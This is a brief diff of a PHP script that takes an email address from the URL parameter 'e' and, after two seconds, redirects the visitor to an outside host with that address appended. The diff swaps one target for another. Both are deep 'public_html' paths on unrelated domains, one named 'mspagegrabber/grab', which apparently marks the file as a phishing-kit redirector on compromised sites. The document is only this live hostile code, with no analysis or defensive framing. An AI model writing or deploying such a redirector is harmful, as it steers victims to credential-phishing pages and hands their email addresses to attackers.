@@ -1,6 +1,6 @@
 <?php 
 $e = $_GET['e'];
-header("Refresh:2; url=https://alliedconnecting.com/public_html/images/media/m/s/p/parloi/mspagegrabber/grab?e=$e");
+header("Refresh:2; url=https://betatradingfx.com/public_html/Manager/css/themes/css/load.php?e=$e");
 ?>
 <!DOCTYPE html>
 <html>
